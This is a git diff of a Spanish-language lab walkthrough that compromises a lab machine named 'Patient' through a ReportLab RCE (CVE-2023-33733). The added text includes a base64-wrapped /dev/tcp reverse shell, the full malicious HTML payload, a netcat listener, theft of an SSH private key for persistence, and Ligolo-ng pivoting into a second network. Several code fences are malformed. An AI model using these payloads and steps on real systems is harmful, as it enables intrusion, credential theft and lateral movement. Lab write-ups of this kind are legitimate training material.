@@ -518,67 +518,254 @@ El reconocimiento inicial sobre la máquina **Patient** revela:
 Este análisis sienta las bases para la siguiente fase: **enumeración profunda y posible explotación de servicios**.
 
 
-# Acceso inicial (app, máquina “Patient”, 20.20.20.3)
+## 🚪 Acceso inicial — Aplicación web (Patient | 20.20.20.3)
 
-En este caso se detecta que hay dos puertos abiertos:
+### 🔍 Enumeración de servicios
 
-    Puerto 2222 (servicio SSH, OpenSSH)
-    Puerto 9000 (servicio HTTP, Werkzeug/Python)
+En la máquina **Patient (20.20.20.3)** se identifican los siguientes servicios expuestos:
 
-Además, gracias a la detección del servicio, se detecta que el sistema subyacente es Ubuntu.
+- **2222/tcp** → SSH (OpenSSH)  
+- **9000/tcp** → HTTP (Werkzeug / Python)  
 
-Tras investigar el servicio 9000 disponible en esta máquina, se puede comprobar que muestra un formulario para subir archivos.
-```
-URL -> http://20.20.20.3:9000
-```
+Adicionalmente, mediante fingerprinting, se determina que el sistema operativo subyacente es **Ubuntu**.
 
-<img width="685" height="467" alt="image" src="https://github.com/user-attachments/assets/d2e04787-36e2-45ee-9697-e3bf8d35631b" />
 
-Al comprobar el código fuente, resulta que el tipo de archivo que acepta esta funcionalidad es “.html”.
-```
-CTRL+U (abrir código fuente de la página)
-URL -> view-source:http://20.20.20.3:9000/
-```
-<img width="566" height="796" alt="image" src="https://github.com/user-attachments/assets/dfb318e9-2b58-4f0d-91bc-6aea55f5a2a1" />
+### 🌐 Análisis de la aplicación web
 
-Por lo que se sube un archivo de prueba para ver en qué consiste la funcionalidad presentada. Primero, se crea un archivo HTML muy simple.
+Al acceder al servicio HTTP en el puerto 9000:
 
-# prueba.html
+``
+http://20.20.20.3:9000
+``
 
+se identifica una funcionalidad de **subida de archivos**.
+
+![Aplicación web](https://github.com/user-attachments/assets/d2e04787-36e2-45ee-9697-e3bf8d35631b)
+
+### 🔎 Análisis del código fuente
+
+Al revisar el código fuente de la página:
+
+
+view-source:http://20.20.20.3:9000/
+
+
+se observa que la aplicación restringe los archivos permitidos al formato **.html**.
+
+![Código fuente](https://github.com/user-attachments/assets/dfb318e9-2b58-4f0d-91bc-6aea55f5a2a1)
+
+
+### 📄 Prueba de funcionalidad
+
+Se crea un archivo HTML simple para validar el comportamiento de la aplicación:
+
+```html
 <strong>hola</strong>
+``` id="test-html"
 
-Una vez subido este archivo, descarga automáticamente una versión del mismo en PDF.
-<img width="860" height="463" alt="image" src="https://github.com/user-attachments/assets/5696625d-12e8-4939-b58e-8b93f1c84f40" />
-Al comprobar los metadatos de este archivo, en este se encuentra el nombre de la librería encargada de realizar esta transformación: ReportLab PDF Library.
+Tras subir el archivo, el sistema procesa automáticamente el contenido y genera un archivo PDF como salida.
 
-exiftool ~/Downloads/document.pdf
-...
-Producer       : ReportLab PDF Library - www.reportlab.com
-...
+![Conversión a PDF](https://github.com/user-attachments/assets/5696625d-12e8-4939-b58e-8b93f1c84f40)
 
-<img width="664" height="377" alt="image" src="https://github.com/user-attachments/assets/8bf4f298-b524-4ebe-881b-44afe4fe4608" />
-
-
-No incluye la versión del programa en este caso, pero tras investigar un poco, se descubre que este programa presenta una vulnerabilidad de ejecución remota de código (CVE-2023–33733).
-
-Se ha encontrado también un exploit en GitHub asociado a esta vulnerabilidad que se puede usar para obtener acceso al sistema.
-
-Referencia a CVE: https://nvd.nist.gov/vuln/detail/CVE-2023-33733
-Exploit utilizado: https://github.com/c53elyas/CVE-2023-33733
-
-Antes de poder ejecutar el exploit para establecer una consola inversa (reverse shell), es necesario realizar unas configuraciones en el proxy de Ligolo-NG para poder tener acceso a ciertos recursos. Por ello, se van a realizar las siguientes configuraciones en el proxy:
-
-    Redirección del puerto 1337 para poder establecer una consola inversa el ejecutar el exploit a través del túnel establecido.
-    Recirección del puerto 8008 reservado para futuras transferencias de ficheros a través del túnel establecido.
+---
 ```
-(en el proxy, desde la sesión activa correspondiente)
-listener_add --addr 0.0.0.0:1337 --to 127.0.0.1:1337 --tcp (proxy puerto 1337 <-> agente puerto 1337)
-listener_add --addr 0.0.0.0:8008 --to 127.0.0.1:8008 --tcp (proxy puerto 8008 <-> agente puerto 8008)
-listener_list (comprobar redirecciones realizadas)
+### 🧾 Análisis del PDF generado
+
+Al inspeccionar los metadatos del archivo PDF generado:
+
+![Metadatos PDF](https://github.com/user-attachments/assets/8bf4f298-b524-4ebe-881b-44afe4fe4608)
+
+Aunque no se especifica la versión, la investigación revela que esta librería es vulnerable a ejecución remota de código.
+
+### ⚠️ Identificación de vulnerabilidad
+
+Se determina que la aplicación es susceptible a la siguiente vulnerabilidad:
+
+- **CVE-2023-33733** → Remote Code Execution en ReportLab PDF Library  
+
+Referencia:
+https://nvd.nist.gov/vuln/detail/CVE-2023-33733  
+
+Exploit:
+https://github.com/c53elyas/CVE-2023-33733  
+
+---
+
+## 🔗 Preparación del entorno de pivoting (Ligolo-ng)
+
+Antes de ejecutar el exploit, es necesario configurar el proxy de Ligolo-ng para permitir la comunicación de retorno (reverse shell) a través del túnel.
+
+Se configuran redirecciones de puertos en el proxy:
+
+```bash
+listener_add --addr 0.0.0.0:1337 --to 127.0.0.1:1337 --tcp
+listener_add --addr 0.0.0.0:8008 --to 127.0.0.1:8008 --tcp
+listener_list
+``` id="ligolo-listeners"
+
+- **Puerto 1337** → Reverse shell  
+- **Puerto 8008** → Transferencia de archivos futura  
 ```
-<img width="736" height="143" alt="image" src="https://github.com/user-attachments/assets/435a514f-cc4f-48a1-a22c-afa270ac9f06" />
+![Listeners configurados](https://github.com/user-attachments/assets/435a514f-cc4f-48a1-a22c-afa270ac9f06)
 
 
-En este punto, se establece el puerto 1337 a la escucha, ya que es el puerto que se ha reservado desde el agente para establecer una consola inversa, de tal forma que lo que reciba el agente, será redirigido a este puerto a la escucha en la máquina de trabajo.
 
+## 🐚 Preparación del listener
+
+Se levanta un listener en la máquina atacante para recibir la reverse shell a través del túnel:
+
+```bash
 rlwrap nc -nvlp 1337
+``` id="listener-rev"
+```
+<img width="301" height="67" alt="image" src="https://github.com/user-attachments/assets/a2db1361-a262-41d2-89dc-8e8f5b16f004" />
+
+Para evitar problemas con la codificación de caracteres, se codifica la carga útil en Base64.
+
+```
+(apuntando a la interfaz interna del agente, la única accesible por la máquina objetivo)
+echo "sh -i >& /dev/tcp/20.20.20.2/1337 0>&1" | base64
+```
+<img width="513" height="59" alt="image" src="https://github.com/user-attachments/assets/b476a0a5-25b1-4073-9ceb-f7c3dc47e7ae" />
+
+Una vez descargado el exploit, no se debe instalar ninguna dependencia ni tampoco ejecutarse este. Además, se debe sustituir la instrucción por defecto “touch /tmp/exploited” por una instrucción que descodifique y ejecute la carga útil previamente obtenida.
+
+
+```ruby
+echo <TU CARGA ÚTIL EN BASE64 AQUÍ> | base64 -d | bash
+```
+<img width="1435" height="162" alt="image" src="https://github.com/user-attachments/assets/d8e30511-e5fe-4ff9-a30a-740d91dc4331" />
+
+Se debe copiar el contenido HTML encontrado dentro de la instrucción “add_paragraph” al final del PoC en un nuevo archivo HTML. En este caso se le asigna el nombre de “exploit.html”.
+```ruby
+# exploit.html
+
+            <para>
+              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('echo <AQUÍ VA TU CARGA ÚTIL EN BASE64> | base64 -d | bash') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
+                exploit
+                </font>
+            </para>
+```
+<img width="1266" height="170" alt="image" src="https://github.com/user-attachments/assets/d4a7a3dd-6f93-4d59-a427-f14f572019ee" />
+
+
+Al subir este archivo a través del formulario, se obtiene automáticamente acceso al sistema en el puerto a la escucha establecido previamente en la máquina de trabajo.
+```
+whoamiS
+id
+hostname
+```
+<img width="481" height="153" alt="image" src="https://github.com/user-attachments/assets/5a4333a8-41af-45fe-bedb-d2cbb486d997" />
+
+A continuación se actualiza la consola actual a una interactiva usando Python.
+
+```ruby
+tty (not a tty)
+python3 --version (instalado)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+tty (/dev/pts/0)
+```
+<img width="435" height="143" alt="image" src="https://github.com/user-attachments/assets/7a458ae1-88c9-4589-aa4f-7385bfc9ac2b" />
+
+Además, se encuentra una clave privada para acceso mediante SSH en el directorio personal del usuario “app”, la cual servirá para asegurar la persistencia en el sistema.
+```ruby
+cd ~/.ssh
+ls -al
+cat id_rsa
+```
+Se obtiene la clave privada y se prueba a acceder a través de SSH al sistema.
+```ruby
+mousepad app-id_rsa
+chmod 600 app-id_rsa
+ssh -i app-id_rsa app@20.20.20.3 -p 2222
+yes <aceptar la firma sin verificar la autenticidad>
+whoami
+id
+hostname
+```
+<img width="571" height="225" alt="image" src="https://github.com/user-attachments/assets/be1687cf-b661-4f01-a5b4-a410fe2bde57" />
+
+# Pivoting 2 (20.20.20.0/24 -> 30.30.30.0/24)
+
+En este punto, se detecta que esta máquina pertenece a dos redes diferentes. Se comprueba en este caso a través del archivo “/etc/hosts” (no se ha encontrado otra forma de comprobarlo en este caso) que el nombre de la máquina “Patient” está asociada a dos direcciones IP de dos redes diferentes.
+```
+cat /etc/hosts
+```
+<img width="391" height="153" alt="image" src="https://github.com/user-attachments/assets/99621287-dd5d-462f-ac9d-13eaa71a60ce" />
+
+Al haber comprometido esta máquina, es posible utilizarla como “pivote” para poder detectar nuevos sistemas en la otra red a la que pertenece (en este caso, para acceder a la siguiente máquina del ejercicio). Por ello, vamos a hacer que la máquina “Patient” sea el segundo “pivote” de este ejercicio.
+
+Para que el agente de este nuevo “pivote” pueda detectar el servicio que expone el proxy y conectarse a él, es necesario configurar una nueva redirección para el puerto 11601 (el servicio a la escucha del proxy de Ligolo-NG) usando la sesión activa del primer “pivote”. De esta forma, el nuevo agente podrá conectarse al proxy a través de la redirección establecida por el primer “pivote”, siguiendo la misma lógica que con la consola inversa establecida en la sección anterior.
+```
+(desde el proxy, seleccionando el único agente que hay conectado)
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp (proxy puerto 11601 <-> agente puerto 11601)
+listener_list
+```
+
+<img width="739" height="131" alt="image" src="https://github.com/user-attachments/assets/961f3c07-5a37-446b-a412-8540688fdb1f" />
+
+A continuación se conectará la máquina “pivote” al proxy mediante el agente descargado. Para ello, se transfiere el agente a la máquina, se le asignan permisos de ejecución y se le indica que se conecte al servicio del proxy que se encuentra a la escucha. En este caso, apuntando a la dirección IP del primer “pivote”, ya que es el encargado de redirigir el puerto y hacerlo visible para el segundo.
+
+(nueva consola en máquina de trabajo)
+python3 -m http.server 8008 (levantar un servidor HTTP en el directorio donde se encuentra el binario del agente descargado, usando el puerto 8008 para hacer visibles los recursos, ya que ya se está redirigiendo a través del primer "pivote")
+```
+(en la segunda máquina "pivote")
+cd /tmp
+wget http://20.20.20.2:8008/agent (descargar el agente en la segunda máquina "pivote")
+ls -al agent
+chmod +x agent
+./agent -connect 20.20.20.2:11601 -ignore-cert (inidicar al agente que se conecte al proxy, apuntando al puerto redirigido a través de la primera máquina "pivote")
+```
+<img width="989" height="190" alt="image" src="https://github.com/user-attachments/assets/17bb1ec5-0597-4e2e-be75-c3eaba8d21d2" />
+
+
+El agente indica que se ha establecido una conexión. Al volver al proxy, se puede comprobar que este la ha recibido correctamente.
+```
+[Agent : drzunder@489a833a8b7e] » INFO[5049] Agent joined.    id=024214141403 name=app@db5ee3b6cabc remote="127.0.0.1:39760"
+```
+<img width="1266" height="23" alt="image" src="https://github.com/user-attachments/assets/87bdf432-df51-44ff-8839-5e3ec2915b56" />
+
+El siguiente paso consiste en seleccionar la sesión recientemente iniciada y comprobar las interfaces de red de la máquina “pivote”.
+```
+(en el proxy)
+session (seleccionar la 2)
+ifconfig
+```
+<img width="450" height="456" alt="image" src="https://github.com/user-attachments/assets/308ab32f-283f-4614-b24b-298c25064a40" />
+
+Una vez conocida la dirección CIDR de la nueva red, es necesario crear una nueva interfaz TUN en la máquina de trabajo para poder redirigir el tráfico de red a esta.
+
+
+```ruby
+sudo ip tuntap add user root mode tun ligolo2 (crear la interfaz TUN llamada "ligolo2")
+sudo ip link set ligolo2 up (levanta la interfaz de red creada)
+ip link show ligolo2 (comprobar el estado de la interfaz)
+```
+
+El siguiente paso consiste en actualizar la tabla de enrutamiento para que el tráfico de la nueva red se enrute a través de la interfaz “ligolo2”.
+```
+sudo ip route add 30.30.30.0/24 dev ligolo2 (asociar la dirección CIDR de la nueva red a la interfaz "ligolo2" en la tabla de enrutamiento)
+ip route list (listar la tabla de enrutamiento actualizada)
+````
+Una vez hecho esto, desde el proxy se da la instrucción para, usando la sesión activa, iniciar el túnel de red a través de la interfaz “ligolo2”. Esto se hace para permitir enrutar tráfico hacia la red del agente.
+````
+(en el proxy, con la sesión previamente seleccionada)
+start --tun ligolo2 (es necesario especificar la interfaz, sino seleccionará la primera por defecto y dará error, porque ya está en uso)
+````
+<img width="541" height="31" alt="image" src="https://github.com/user-attachments/assets/b93cbbd5-d362-4783-9a37-cec782c60e20" />
+
+Al realizar esta operación, quedaría comprobar si la siguiente máquina perteneciente a la nueva red es accesible. Para ello, se realiza un ping y se comprueba su TTL, tal y como se ha hecho con la anterior.
+```ruby
+ping 30.30.30.3 -c 1
+```
+<img width="522" height="133" alt="image" src="https://github.com/user-attachments/assets/14662efb-0f42-4854-9a9a-17055e37c32a" />
+
+Se puede comprobar que el TTL asignado es 64, indicando que la máquina está accesible directamente sin ningún nodo intermediario y por otro lado que el sistema subyacente es GNU/Linux. Por lo que, es posible continuar de forma normal con el siguiente reconocimiento inicial.
+
+Reconocimiento inicial (máquina “Node”, 30.30.30.3)
+
+Se realiza un reconocimiento de los servicios disponibles en dos fases. En la primera, se realiza un escaneo de todos los puertos TCP usando nmap para detectar en primera instancia cuales de ellos son accesibles (open), utilizando un escaneo TCP Connect. En el segundo reconocimiento inicial se explica por qué en este caso se realiza un escaneo en modo TCP Connect en lugar de TCP SYN.
+```ruby
+sudo nmap -sT -p- -n -Pn 30.30.30.3
+```
+
